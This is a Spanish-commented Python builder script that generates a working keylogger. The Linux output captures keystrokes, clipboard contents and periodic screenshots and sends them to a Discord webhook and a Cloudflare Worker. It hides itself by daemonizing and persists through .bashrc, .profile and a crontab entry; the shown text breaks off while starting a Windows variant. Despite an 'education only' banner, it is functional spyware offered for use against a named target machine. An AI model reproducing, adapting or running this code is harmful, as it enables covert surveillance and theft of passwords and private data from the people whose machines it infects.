#!/usr/bin/env python3
"""
BUILDER KEYLOGGER REAL DEFINITIVO - VERSIÓN CORREGIDA (TIPO INT)
Captura de pantalla Linux funcional + comparaciones corregidas (int vs str)
Genera .bat que funcionan con python -m PyInstaller
"""

import os
import sys
import json
import shutil
from datetime import datetime

class RealKeyloggerBuilder:
    def __init__(self):
        self.clear_screen()
        self.config = {}
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def show_banner(self):
        banner = """
        ╔══════════════════════════════════════════════════╗
        ║     BUILDER KEYLOGGER - VERSIÓN CORREGIDA        ║
        ║     Fix: .bat con python -m PyInstaller          ║
        ╚══════════════════════════════════════════════════╝
        
        ⚠️  SOLO PARA EDUCACIÓN - LABORATORIOS CONTROLADOS
        """
        print(banner)
    
    def get_user_input(self):
        """Obtiene toda la configuración necesaria"""
        print("\n" + "="*60)
        print("CONFIGURACIÓN DEL PROYECTO CON CLOUDFLARE WORKER")
        print("="*60)
        
        # Nombre de la máquina
        while True:
            machine = input("\n[?] Nombre de la máquina objetivo: ").strip()
            if machine:
                self.config['machine'] = machine
                break
            print("[!] El nombre no puede estar vacío")
        
        # Webhook de Discord
        webhook = input("\n[?] Webhook de Discord (Enter para modo simulación): ").strip()
        self.config['webhook'] = webhook if webhook else "SIMULATION_MODE"
        
        # Cloudflare Worker URL
        worker_url = input("\n[?] URL del Cloudflare Worker (para imágenes): ").strip()
        if not worker_url:
            worker_url = "jiji"
        self.config['worker_url'] = worker_url
        
        # Plataforma
        print("\n[?] Plataforma:")
        print("  1. Solo Linux (Keylogger REAL con Worker - CORREGIDO)")
        print("  2. Solo Windows (Keylogger REAL con Worker)")
        print("  3. Ambos (recomendado)")
        
        while True:
            choice = input("\n[>] Opción (1-3): ").strip()
            if choice in ['1', '2', '3']:
                self.config['platform'] = choice
                break
            print("[!] Opción inválida")
        
        # Características avanzadas
        print("\n[?] Características avanzadas:")
        self.config['stealth'] = input("   ¿Modo stealth (oculto)? (s/n): ").lower() == 's'
        self.config['persistence'] = input("   ¿Añadir persistencia (auto-inicio)? (s/n): ").lower() == 's'
        self.config['screenshots'] = input("   ¿Capturar screenshots? (s/n): ").lower() == 's'
        self.config['screenshot_interval'] = 30  # segundos por defecto
        if self.config['screenshots']:
            try:
                interval = int(input("   Intervalo screenshots (segundos, default 30): ").strip() or 30)
                self.config['screenshot_interval'] = max(10, interval)  # mínimo 10 segundos
            except:
                pass
        
        self.config['clipboard'] = input("   ¿Capturar portapapeles? (s/n): ").lower() == 's'
        self.config['hide_console'] = input("   ¿Ocultar consola en Windows? (s/n): ").lower() == 's'
        
        # Método de captura preferido para Linux
        print("\n[?] Método de captura preferido para Linux:")
        print("  1. mss (recomendado - Python puro)")
        print("  2. scrot (herramienta externa - más estable)")
        print("  3. pyautogui (alternativa)")
        print("  4. Auto-detect (prueba todos)")
        
        while True:
            capture_choice = input("\n[>] Opción (1-4, default 4): ").strip() or "4"
            if capture_choice in ['1', '2', '3', '4']:
                self.config['linux_capture_method'] = int(capture_choice)  # ¡IMPORTANTE! Convertir a int
                break
            print("[!] Opción inválida")
        
        # Fecha y autor
        self.config['date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.config['author'] = os.getenv('USER', 'unknown')
        
        return self.config
    
    def generate_linux_keylogger_worker_fixed(self):
        """Genera keylogger REAL para Linux con comparaciones corregidas (int)"""
        print("\n[+] Generando keylogger Linux CORREGIDO (comparaciones int)...")
        
        stealth_bool = 'True' if self.config['stealth'] else 'False'
        screenshots_bool = 'True' if self.config['screenshots'] else 'False'
        persistence_bool = 'True' if self.config['persistence'] else 'False'
        clipboard_bool = 'True' if self.config['clipboard'] else 'False'
        screenshot_interval = self.config['screenshot_interval']
        capture_method = self.config['linux_capture_method']  # Ya es int
        
        linux_code = f'''#!/usr/bin/env python3
"""
KEYLOGGER REAL PARA LINUX - {self.config['machine']} CON CLOUDFLARE WORKER
¡CAPTURA TECLAS REALES Y ENVÍA IMÁGENES AL WORKER!
VERSIÓN CORREGIDA: Comparaciones con enteros (no strings)
Solo para fines educativos en laboratorios controlados
"""

import os
import sys
import time
import threading
import tempfile
import requests
import subprocess
from datetime import datetime

# ============================================
# CONFIGURACIÓN
# ============================================
MACHINE_NAME = "{self.config['machine']}"
WEBHOOK_URL = "{self.config['webhook']}"
WORKER_URL = "{self.config['worker_url']}"
STEALTH_MODE = {stealth_bool}
SCREENSHOTS_ENABLED = {screenshots_bool}
SCREENSHOT_INTERVAL = {screenshot_interval}
PERSISTENCE_ENABLED = {persistence_bool}
CLIPBOARD_ENABLED = {clipboard_bool}
PREFERRED_CAPTURE_METHOD = {capture_method}  # 1=mss, 2=scrot, 3=pyautogui, 4=auto

# ============================================
# CLASE PRINCIPAL - KEYLOGGER REAL LINUX
# ============================================
class RealLinuxKeylogger:
    def __init__(self):
        self.running = True
        self.log_buffer = ""
        self.log_file = os.path.join(tempfile.gettempdir(), f".sys_{{os.getpid()}}.log")
        self.screenshots_sent = 0
        
        if not STEALTH_MODE:
            self.show_banner()
    
    def hide_linux_terminal(self):
        """Oculta la terminal en Linux - VERSIÓN SEGURA"""
        if STEALTH_MODE:
            # Fork para ejecutar en background
            pid = os.fork()
            if pid > 0:
                sys.exit(0)  # Salir del proceso padre
            
            # Crear nueva sesión
            os.setsid()
            
            # Cambiar directorio
            os.chdir('/')
            
            # Redirigir stdin, stdout, stderr a /dev/null
            with open(os.devnull, 'r') as f:
                os.dup2(f.fileno(), sys.stdin.fileno())
            with open(os.devnull, 'a') as f:
                os.dup2(f.fileno(), sys.stdout.fileno())
            with open(os.devnull, 'a') as f:
                os.dup2(f.fileno(), sys.stderr.fileno())
            
            # Cerrar todos los file descriptors extra
            try:
                maxfd = os.sysconf("SC_OPEN_MAX")
                for fd in range(3, maxfd):
                    try:
                        os.close(fd)
                    except:
                        pass
            except:
                pass
    
    def show_banner(self):
        """Mostrar banner"""
        print("="*60)
        print("   KEYLOGGER REAL PARA LINUX - CAPTURA ACTIVA")
        print(f"   Máquina: {{MACHINE_NAME}}")
        print(f"   Worker: {{WORKER_URL}}")
        print(f"   Método captura: {{PREFERRED_CAPTURE_METHOD}}")
        print("="*60)
    
    def log_message(self, message):
        """Función segura para logging que no falla si stdout está cerrado"""
        if not STEALTH_MODE:
            try:
                print(message)
                sys.stdout.flush()
            except:
                pass
    
    def safe_file_write(self, filename, content, mode='a'):
        """Escribe en archivo de forma segura"""
        try:
            with open(filename, mode, encoding='utf-8') as f:
                f.write(content)
            return True
        except Exception as e:
            return False
    
    def start_keyboard_capture(self):
        """Inicia captura REAL de teclado con pynput"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    key_str = self.key_to_string(key)
                    self.log_buffer += key_str
                    
                    # Guardar en archivo local de forma segura
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    log_entry = f"[{{timestamp}}] {{key_str}}"
                    self.safe_file_write(self.log_file, log_entry)
                    
                    if not STEALTH_MODE and len(self.log_buffer) % 20 == 0:
                        self.log_message(f"[ACTIVO] Capturando... ({{len(self.log_buffer)}} chars)")
                    
                    if len(self.log_buffer) >= 100:
                        self.send_to_discord()
                        
                except Exception:
                    pass
            
            def key_to_string(self, key):
                try:
                    if hasattr(key, 'char') and key.char:
                        return key.char
                    elif key == keyboard.Key.space:
                        return " "
                    elif key == keyboard.Key.enter:
                        return "\\n"
                    elif key == keyboard.Key.backspace:
                        return "[BACKSPACE]"
                    elif key == keyboard.Key.tab:
                        return "[TAB]"
                    elif key == keyboard.Key.esc:
                        return "[ESC]"
                    else:
                        return f"[{{str(key).replace('Key.', '').upper()}}]"
                except:
                    return "[UNKNOWN]"
            
            self.key_to_string = key_to_string.__get__(self)
            
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.daemon = True
            self.listener.start()
            
            self.log_message("[✓] Captura de teclado INICIADA")
            
        except ImportError:
            self.log_message("[!] ERROR: pynput no instalado")
            self.log_message("[+] Instalar con: pip install pynput")
            sys.exit(1)
    
    def capture_clipboard(self):
        """Captura contenido del portapapeles"""
        if not CLIPBOARD_ENABLED:
            return
        
        try:
            import pyperclip
            
            last_clipboard = ""
            while self.running:
                try:
                    current = pyperclip.paste()
                    if current and current != last_clipboard:
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        clipboard_log = f"\\n[CLIPBOARD {{timestamp}}] {{current[:200]}}"
                        
                        self.safe_file_write(self.log_file, clipboard_log)
                        
                        self.log_buffer += clipboard_log
                        last_clipboard = current
                        
                        self.log_message(f"[CLIPBOARD] Capturado: {{current[:50]}}...")
                
                except Exception as e:
                    pass
                
                time.sleep(2)
                
        except ImportError:
            self.log_message("[!] pyperclip no instalado para clipboard")
    
    def capture_screenshots(self):
        """Captura screenshots periódicos y los envía al Cloudflare Worker"""
        if not SCREENSHOTS_ENABLED:
            return
        
        counter = 0
        
        while self.running:
            time.sleep(SCREENSHOT_INTERVAL)
            counter += 1
            
            try:
                # Capturar screenshot - MÚLTIPLES MÉTODOS PARA LINUX
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = os.path.join(tempfile.gettempdir(), f"sc_{{MACHINE_NAME}}_{{timestamp}}_{{counter}}.png")
                
                screenshot_captured = False
                method_used = ""
                
                # MÉTODO PREFERIDO O AUTO-DETECT - ¡COMPARACIONES CON ENTEROS!
                if PREFERRED_CAPTURE_METHOD == 1 or PREFERRED_CAPTURE_METHOD == 4:
                    # MÉTODO 1: Usar mss (recomendado para Linux)
                    try:
                        import mss
                        with mss.mss() as sct:
                            # Capturar todo el monitor primario
                            monitor = sct.monitors[1]  # Monitor primario
                            screenshot = sct.grab(monitor)
                            
                            # Guardar la imagen
                            mss.tools.to_png(screenshot.rgb, screenshot.size, output=filename)
                            screenshot_captured = True
                            method_used = "mss"
                            self.log_message(f"[SCREENSHOT] Capturado con mss: {{filename}}")
                    except ImportError:
                        if PREFERRED_CAPTURE_METHOD == 1:
                            self.log_message("[!] mss no instalado, método preferido falló")
                        else:
                            self.log_message("[!] mss no instalado, probando siguiente método...")
                    except Exception as e:
                        self.log_message(f"[!] Error con mss: {{str(e)}}")
                
                if (not screenshot_captured and (PREFERRED_CAPTURE_METHOD == 2 or PREFERRED_CAPTURE_METHOD == 4)):
                    # MÉTODO 2: Usar scrot (herramienta de línea de comandos)
                    try:
                        # Verificar si scrot está instalado
                        result = subprocess.run(['which', 'scrot'], capture_output=True, text=True)
                        if result.returncode == 0:
                            # Usar scrot para capturar pantalla
                            subprocess.run(['scrot', filename, '-q', '100'], check=True)
                            screenshot_captured = True
                            method_used = "scrot"
                            self.log_message(f"[SCREENSHOT] Capturado con scrot: {{filename}}")
                        else:
                            if PREFERRED_CAPTURE_METHOD == 2:
                                self.log_message("[!] scrot no instalado en el sistema")
                            else:
                                self.log_message("[!] scrot no disponible, probando siguiente método...")
                    except Exception as e:
                        self.log_message(f"[!] Error con scrot: {{str(e)}}")
                
                if (not screenshot_captured and (PREFERRED_CAPTURE_METHOD == 3 or PREFERRED_CAPTURE_METHOD == 4)):
                    # MÉTODO 3: Usar pyautogui (requiere display)
                    try:
                        import pyautogui
                        screenshot = pyautogui.screenshot()
                        screenshot.save(filename)
                        screenshot_captured = True
                        method_used = "pyautogui"
                        self.log_message(f"[SCREENSHOT] Capturado con pyautogui: {{filename}}")
                    except ImportError:
                        self.log_message("[!] pyautogui no instalado")
                    except Exception as e:
                        self.log_message(f"[!] Error con pyautogui: {{str(e)}}")
                
                # MÉTODO 4: Usar importgtk (para GNOME) - solo si auto-detect
                if not screenshot_captured and PREFERRED_CAPTURE_METHOD == 4:
                    try:
                        import gi
                        gi.require_version('Gdk', '3.0')
                        from gi.repository import Gdk
                        
                        window = Gdk.get_default_root_window()
                        width, height = window.get_width(), window.get_height()
                        
                        pb = Gdk.pixbuf_get_from_window(window, 0, 0, width, height)
                        
                        if pb:
                            pb.savev(filename, "png", [], [])
                            screenshot_captured = True
                            method_used = "gdk"
                            self.log_message(f"[SCREENSHOT] Capturado con GDK: {{filename}}")
                    except ImportError:
                        self.log_message("[!] Gi (GObject Introspection) no disponible")
                    except Exception as e:
                        self.log_message(f"[!] Error con GDK: {{str(e)}}")
                
                # Si se capturó la pantalla, enviar al Worker
                if screenshot_captured and os.path.exists(filename):
                    # Verificar tamaño del archivo
                    file_size = os.path.getsize(filename)
                    if file_size > 0:
                        self.log_message(f"[+] Screenshot capturado ({{method_used}}, {{file_size}} bytes)")
                        
                        # Enviar al Cloudflare Worker
                        success = self.send_screenshot_to_worker(filename, method_used)
                        
                        # Eliminar archivo local después de enviar
                        try:
                            os.remove(filename)
                            self.log_message(f"[✓] Archivo local eliminado: {{filename}}")
                        except:
                            self.log_message(f"[!] No se pudo eliminar archivo: {{filename}}")
                    else:
                        self.log_message(f"[!] Archivo de screenshot vacío: {{filename}}")
                        try:
                            os.remove(filename)
                        except:
                            pass
                else:
                    self.log_message("[!] No se pudo capturar screenshot con ningún método disponible")
                    self.log_message("[+] Instalar dependencias: pip install mss o sudo apt install scrot")
                
            except Exception as e:
                self.log_message(f"[!] Error en captura de screenshot: {{str(e)}}")
    
    def send_screenshot_to_worker(self, filepath, method_used=""):
        """Envía un screenshot al Cloudflare Worker con múltiples métodos"""
        try:
            # Verificar que el archivo existe y tiene tamaño
            if not os.path.exists(filepath):
                self.log_message(f"[!] Archivo no existe: {{filepath}}")
                return False
            
            file_size = os.path.getsize(filepath)
            if file_size == 0:
                self.log_message(f"[!] Archivo vacío: {{filepath}}")
                return False
            
            self.log_message(f"[+] Enviando screenshot ({{file_size}} bytes) a Worker...")
            
            # Métodos de envío a probar
            methods_to_try = [
                ("multipart/form-data", self._send_screenshot_multipart),
                ("bytes directos", self._send_screenshot_bytes),
                ("base64", self._send_screenshot_base64),
            ]
            
            for method_name, method_func in methods_to_try:
                try:
                    self.log_message(f"[+] Probando método: {{method_name}}...")
                    if method_func(filepath, method_used):
                        self.screenshots_sent += 1
                        return True
                except Exception as e:
                    self.log_message(f"[!] Método {{method_name}} falló: {{str(e)[:100]}}")
            
            self.log_message("[!] Todos los métodos de envío fallaron")
            return False
            
        except Exception as e:
            self.log_message(f"[!] Error enviando al Worker: {{str(e)}}")
            return False
    
    def _send_screenshot_multipart(self, filepath, method_used):
        """Método 1: Multipart form-data"""
        with open(filepath, 'rb') as f:
            filename = os.path.basename(filepath)
            files = {{'file': (filename, f, 'image/png')}}
            
            # Headers adicionales
            headers = {{
                'X-Machine-Name': MACHINE_NAME,
                'X-Capture-Method': method_used,
                'X-Timestamp': datetime.now().isoformat()
            }}
            
            response = requests.post(WORKER_URL, files=files, headers=headers, timeout=30)
        
        if response.status_code in [200, 201, 202]:
            self.log_message(f"[✓] Screenshot enviado (multipart) - {{self.screenshots_sent + 1}} total")
            return True
        else:
            self.log_message(f"[!] Error multipart: {{response.status_code}} - {{response.text[:100]}}")
            return False
    
    def _send_screenshot_bytes(self, filepath, method_used):
        """Método 2: Bytes directos con headers"""
        with open(filepath, 'rb') as f:
            image_data = f.read()
        
        headers = {{
            'Content-Type': 'image/png',
            'Content-Length': str(len(image_data)),
            'X-Machine-Name': MACHINE_NAME,
            'X-Filename': os.path.basename(filepath),
            'X-Capture-Method': method_used,
            'X-Timestamp': datetime.now().isoformat()
        }}
        
        response = requests.post(WORKER_URL, data=image_data, headers=headers, timeout=30)
        
        if response.status_code in [200, 201, 202]:
            self.log_message(f"[✓] Screenshot enviado (bytes directos) - {{self.screenshots_sent + 1}} total")
            return True
        else:
            self.log_message(f"[!] Error bytes: {{response.status_code}}")
            return False
    
    def _send_screenshot_base64(self, filepath, method_used):
        """Método 3: Base64 encoding"""
        import base64
        
        with open(filepath, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        payload = {{
            'image': image_data,
            'filename': os.path.basename(filepath),
            'machine': MACHINE_NAME,
            'method': method_used,
            'timestamp': datetime.now().isoformat(),
            'type': 'screenshot'
        }}
        
        headers = {{
            'Content-Type': 'application/json'
        }}
        
        response = requests.post(WORKER_URL, json=payload, headers=headers, timeout=30)
        
        if response.status_code in [200, 201, 202]:
            self.log_message(f"[✓] Screenshot enviado (base64) - {{self.screenshots_sent + 1}} total")
            return True
        else:
            self.log_message(f"[!] Error base64: {{response.status_code}}")
            return False
    
    def send_text_to_worker(self, text, data_type="keylog"):
        """Envía texto al Worker como backup"""
        try:
            # Cortar texto si es muy largo
            if len(text) > 10000:
                text = text[:10000] + "... [TRUNCATED]"
            
            payload = {{
                "text": text, 
                "machine": MACHINE_NAME,
                "type": data_type,
                "timestamp": datetime.now().isoformat(),
                "length": len(text)
            }}
            
            # Intentar diferentes formatos
            headers = {{'Content-Type': 'application/json'}}
            
            try:
                response = requests.post(WORKER_URL, json=payload, headers=headers, timeout=10)
            except:
                # Fallback a form-data
                response = requests.post(WORKER_URL, data=payload, timeout=10)
            
            if response.status_code in [200, 201, 202]:
                self.log_message(f"[✓] Texto enviado al Worker ({{data_type}})")
                return True
            else:
                self.log_message(f"[!] Error texto al Worker: {{response.status_code}}")
                return False
                
        except Exception as e:
            self.log_message(f"[!] Error enviando texto al Worker: {{str(e)}}")
            return False
    
    def send_to_discord(self):
        """Envía el buffer a Discord y también al Worker como backup"""
        if not self.log_buffer or WEBHOOK_URL == "SIMULATION_MODE":
            return
        
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if len(self.log_buffer) > 1500:
                chunks = [self.log_buffer[i:i+1500] for i in range(0, len(self.log_buffer), 1500)]
                for i, chunk in enumerate(chunks):
                    payload = {{
                        "content": f"**{{MACHINE_NAME}}** - {{timestamp}} ({{i+1}}/{{len(chunks)}})\\n```{{chunk}}```",
                        "username": "Linux Keylogger"
                    }}
                    try:
                        response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
                        if response.status_code in [200, 201, 204]:
                            self.log_message(f"[✓] Chunk {{i+1}}/{{len(chunks)}} enviado a Discord")
                        else:
                            self.log_message(f"[!] Discord error: {{response.status_code}}")
                    except Exception as e:
                        self.log_message(f"[!] Error enviando chunk {{i+1}} a Discord: {{str(e)}}")
                    
                    # Enviar chunk al Worker también
                    self.send_text_to_worker(chunk, "discord_backup")
            else:
                payload = {{
                    "content": f"**{{MACHINE_NAME}}** - {{timestamp}}\\n```{{self.log_buffer}}```",
                    "username": "Linux Keylogger"
                }}
                try:
                    response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
                    if response.status_code in [200, 201, 204]:
                        self.log_message("[✓] Datos enviados a Discord")
                    else:
                        self.log_message(f"[!] Discord error: {{response.status_code}}")
                except Exception as e:
                    self.log_message(f"[!] Error enviando a Discord: {{str(e)}}")
                
                # Enviar todo al Worker también
                self.send_text_to_worker(self.log_buffer, "keylog")
            
            self.log_buffer = ""
                
        except Exception as e:
            self.log_message(f"[!] Error crítico en send_to_discord: {{str(e)}}")
            
            # Intentar enviar solo al Worker si Discord falla
            try:
                error_msg = f"Error Discord: {{str(e)}}. Texto: {{self.log_buffer[:1000]}}"
                self.send_text_to_worker(error_msg, "error")
            except:
                pass
    
    def add_persistence(self):
        """Añade persistencia al sistema Linux"""
        if not PERSISTENCE_ENABLED:
            return
        
        try:
            script_path = os.path.abspath(__file__)
            
            # 1. Agregar a .bashrc
            bashrc = os.path.expanduser("~/.bashrc")
            startup_cmd = f"nohup python3 {{script_path}} > /dev/null 2>&1 &\\n"
            
            if os.path.exists(bashrc):
                with open(bashrc, 'a') as f:
                    f.write(f'\\n# Auto-start keylogger\\n{{startup_cmd}}')
            
            # 2. Agregar a .profile
            profile = os.path.expanduser("~/.profile")
            if os.path.exists(profile):
                with open(profile, 'a') as f:
                    f.write(f'\\n{{startup_cmd}}')
            
            # 3. Agregar a crontab
            try:
                cron_job = f"@reboot python3 {{script_path}}\\n"
                
                # Obtener crontab actual
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                current_cron = result.stdout if result.returncode == 0 else ""
                
                # Agregar nuestro job si no existe
                if script_path not in current_cron:
                    new_cron = current_cron + cron_job
                    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                        f.write(new_cron)
                        temp_file = f.name
                    
                    subprocess.run(['crontab', temp_file])
                    os.remove(temp_file)
            
            except Exception as e:
                pass
            
            self.log_message("[✓] Persistencia configurada")
                
        except Exception as e:
            self.log_message(f"[!] Error en persistencia: {{str(e)}}")
    
    def install_screenshot_deps(self):
        """Instala dependencias para screenshots en Linux - CORREGIDO (int)"""
        if not SCREENSHOTS_ENABLED:
            return
        
        self.log_message("[+] Verificando dependencias de screenshots...")
        
        # Instalar dependencias según método preferido - ¡COMPARACIONES CON ENTEROS!
        if PREFERRED_CAPTURE_METHOD == 1 or PREFERRED_CAPTURE_METHOD == 4:
            try:
                import mss
                self.log_message("[✓] mss ya instalado")
            except ImportError:
                self.log_message("[+] Instalando mss...")
                try:
                    subprocess.run([sys.executable, "-m", "pip", "install", "mss"], 
                                 capture_output=True, text=True)
                    self.log_message("[✓] mss instalado")
                except Exception as e:
                    self.log_message(f"[!] No se pudo instalar mss: {{str(e)}}")
        
        if PREFERRED_CAPTURE_METHOD == 2 or PREFERRED_CAPTURE_METHOD == 4:
            # Verificar scrot
            try:
                result = subprocess.run(['which', 'scrot'], capture_output=True, text=True)
                if result.returncode == 0:
                    self.log_message("[✓] scrot ya instalado")
                else:
                    self.log_message("[+] scrot no encontrado, puedes instalarlo con:")
                    self.log_message("    sudo apt-get install scrot   # Debian/Ubuntu")
                    self.log_message("    sudo yum install scrot       # RHEL/CentOS")
            except:
                self.log_message("[!] No se pudo verificar scrot")
        
        if PREFERRED_CAPTURE_METHOD == 3 or PREFERRED_CAPTURE_METHOD == 4:
            try:
                import pyautogui
                self.log_message("[✓] pyautogui ya instalado")
            except ImportError:
                self.log_message("[+] pyautogui no instalado, opcional")
    
    def run(self):
        """Ejecuta el keylogger"""
        if STEALTH_MODE:
            self.hide_linux_terminal()
        else:
            self.log_message(f"[+] Iniciando en modo DEBUG (STEALTH_MODE=False)")
            self.log_message(f"[+] Worker URL: {{WORKER_URL}}")
            self.log_message(f"[+] Método captura: {{PREFERRED_CAPTURE_METHOD}}")
        
        # Instalar dependencias de screenshots si es necesario
        if SCREENSHOTS_ENABLED and not STEALTH_MODE:
            self.install_screenshot_deps()
        
        if PERSISTENCE_ENABLED:
            self.add_persistence()
        
        self.start_keyboard_capture()
        
        threads = []
        
        if CLIPBOARD_ENABLED:
            t = threading.Thread(target=self.capture_clipboard)
            t.daemon = True
            t.start()
            threads.append(t)
        
        if SCREENSHOTS_ENABLED:
            t = threading.Thread(target=self.capture_screenshots)
            t.daemon = True
            t.start()
            threads.append(t)
        
        def periodic_send():
            while self.running:
                time.sleep(60)  # Enviar cada 60 segundos
                if self.log_buffer:
                    self.send_to_discord()
        
        t = threading.Thread(target=periodic_send)
        t.daemon = True
        t.start()
        threads.append(t)
        
        # Verificar Worker al inicio
        if not STEALTH_MODE:
            self.test_worker_connection()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.log_message("\\n[!] Deteniendo...")
            self.running = False
        except Exception as e:
            self.log_message(f"[!] Error inesperado: {{str(e)}}")
            self.running = False
        
        # Enviar datos restantes antes de salir
        if self.log_buffer:
            self.send_to_discord()
        
        # Limpiar archivo temporal
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
        except:
            pass
        
        self.log_message("[+] Keylogger detenido")
    
    def test_worker_connection(self):
        """Prueba la conexión al Worker"""
        self.log_message("[+] Probando conexión al Worker...")
        try:
            test_payload = {{
                "test": True,
                "machine": MACHINE_NAME,
                "timestamp": datetime.now().isoformat(),
                "message": "Connection test from keylogger"
            }}
            
            response = requests.post(WORKER_URL, json=test_payload, timeout=10)
            
            if response.status_code in [200, 201, 202]:
                self.log_message(f"[✓] Worker responde correctamente ({{response.status_code}})")
                return True
            else:
                self.log_message(f"[!] Worker error: {{response.status_code}} - {{response.text[:100]}}")
                return False
                
        except Exception as e:
            self.log_message(f"[!] No se puede conectar al Worker: {{str(e)}}")
            self.log_message("[!] Verifica: 1) URL correcta, 2) Internet, 3) Permisos Worker")
            return False

# ============================================
# FUNCIONES DE INSTALACIÓN - CORREGIDAS (int)
# ============================================
def check_and_install_dependencies():
    """Verifica e instala dependencias automáticamente - CORREGIDO (int)"""
    required = {{
        'pynput': 'pynput',
        'requests': 'requests',
        'pyperclip': 'pyperclip'
    }}
    
    # Agregar mss si es el método preferido o auto-detect - ¡COMPARACIÓN CON ENTERO!
    if PREFERRED_CAPTURE_METHOD == 1 or PREFERRED_CAPTURE_METHOD == 4:
        required['mss'] = 'mss'
    
    missing = []
    
    for module, pip_name in required.items():
        try:
            __import__(module)
        except ImportError:
            missing.append(pip_name)
    
    if missing:
        print(f"[!] Módulos faltantes: {{', '.join(missing)}}")
        install = input("[?] ¿Instalar automáticamente? (s/n): ")
        
        if install.lower() == 's':
            import subprocess
            print("[+] Instalando dependencias...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
                print("[✓] Dependencias instaladas correctamente")
                return True
            except Exception as e:
                print(f"[!] Error instalando dependencias: {{e}}")
                print(f"[+] Instalar manualmente con: pip install {{' '.join(missing)}}")
                return False
        else:
            print(f"[+] Instalar manualmente con: pip install {{' '.join(missing)}}")
            return False
    return True

# ============================================
# EJECUCIÓN
# ============================================
if __name__ == "__main__":
    # Solo verificar dependencias en modo no-stealth
    if not STEALTH_MODE:
        if not check_and_install_dependencies():
            sys.exit(1)
    
    # Bandera educativa
    os.environ["EDUCATIONAL_TEST"] = "true"
    
    # Iniciar keylogger
    try:
        keylogger = RealLinuxKeylogger()
        keylogger.run()
    except Exception as e:
        # Si hay error, intentar loguearlo
        try:
            with open(os.path.join(tempfile.gettempdir(), "keylogger_error.log"), "a") as f:
                f.write(f"[{{datetime.now()}}] Error: {{str(e)}}\\n")
        except:
            pass
'''
        
        filename = f"linux_keylogger_fixed_int_{self.config['machine']}.py"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(linux_code)
        
        os.system(f'chmod +x {filename}')
        print(f"[✓] Keylogger Linux CORREGIDO (int) creado: {filename}")
        
        # Crear script de instalación para Linux
        self.create_linux_install_script_int()
        
        return filename
    
    def create_linux_install_script_int(self):
        """Crea un script de instalación para Linux con la corrección int"""
        install_script = f'''#!/bin/bash
# Script de instalación para Linux Keylogger - {self.config['machine']}
# VERSIÓN CORREGIDA: Comparaciones con enteros

echo "=========================================="
echo " INSTALACIÓN KEYLOGGER LINUX - {self.config['machine']}"
echo " VERSIÓN: Comparaciones corregidas (int)"
echo "=========================================="
echo ""

# Verificar Python
if ! command -v python3 &> /dev/null; then
    echo "[!] Python3 no encontrado. Instalando..."
    sudo apt-get update
    sudo apt-get install -y python3 python3-pip
fi

# Instalar dependencias básicas
echo "[+] Instalando dependencias Python básicas..."
pip3 install --upgrade pip
pip3 install pynput requests pyperclip

# Instalar dependencias de screenshots según método seleccionado
CAPTURE_METHOD={self.config['linux_capture_method']}

if [[ $CAPTURE_METHOD == 1 || $CAPTURE_METHOD == 4 ]]; then
    echo "[+] Instalando mss para captura de pantalla..."
    pip3 install mss
fi

if [[ $CAPTURE_METHOD == 2 || $CAPTURE_METHOD == 4 ]]; then
    echo "[+] Instalando scrot para captura de pantalla..."
    if command -v apt-get &> /dev/null; then
        sudo apt-get install -y scrot
    elif command -v yum &> /dev/null; then
        sudo yum install -y scrot
    elif command -v dnf &> /dev/null; then
        sudo dnf install -y scrot
    else
        echo "[!] No se pudo determinar el gestor de paquetes"
        echo "[!] Instala scrot manualmente según tu distribución"
    fi
fi

if [[ $CAPTURE_METHOD == 3 || $CAPTURE_METHOD == 4 ]]; then
    echo "[+] Instalando pyautogui (opcional)..."
    pip3 install pyautogui
fi

# Dar permisos de ejecución
chmod +x linux_keylogger_fixed_int_{self.config['machine']}.py

echo ""
echo "[✓] Instalación completada"
echo "[+] Para ejecutar: python3 linux_keylogger_fixed_int_{self.config['machine']}.py"
echo "[+] Modo stealth: Ya configurado en el script"
echo ""
echo "Configuración:"
echo "- Worker URL: {self.config['worker_url']}"
echo "- Intervalo screenshots: {self.config['screenshot_interval']} segundos"
echo "- Método captura: {self.config['linux_capture_method']} (entero)"
echo "- Comparaciones corregidas: ✓ int en lugar de str"
echo ""
'''
        
        filename = f"install_linux_int_{self.config['machine']}.sh"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(install_script)
        
        os.system(f'chmod +x {filename}')
        print(f"[✓] Script de instalación Linux (int) creado: {filename}")
        return filename
    
    def generate_windows_keylogger_worker(self):
        """Genera keylogger Windows con Cloudflare Worker"""
        print("\n[+] Generando keylogger Windows con Worker...")
        
        stealth_bool = 'True' if self.config['stealth'] else 'False'
        screenshots_bool = 'True' if self.config['screenshots'] else 'False'
        persistence_bool = 'True' if self.config['persistence'] else 'False'
        clipboard_bool = 'True' if self.config['clipboard'] else 'False'
        hide_console_bool = 'True' if self.config['hide_console'] else 'False'
        screenshot_interval = self.config['screenshot_interval']
        
        windows_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KEYLOGGER PARA WINDOWS CON CLOUDFLARE WORKER - {self.config['machine']}
VERSIÓN CORREGIDA: Envía imágenes y datos al Worker
"""

import os
import sys
import time
import threading
import tempfile
import requests
from datetime import datetime

# ============================================
# CONFIGURACIÓN (EMBEBIDA PARA .EXE)
# ============================================
CONFIG = {{
    "machine": "{self.config['machine']}",
    "webhook": "{self.config['webhook']}",
    "worker_url": "{self.config['worker_url']}",
    "stealth": {stealth_bool},
    "screenshots": {screenshots_bool},
    "screenshot_interval": {screenshot_interval},
    "persistence": {persistence_bool},
    "clipboard": {clipboard_bool},
    "hide_console": {hide_console_bool}
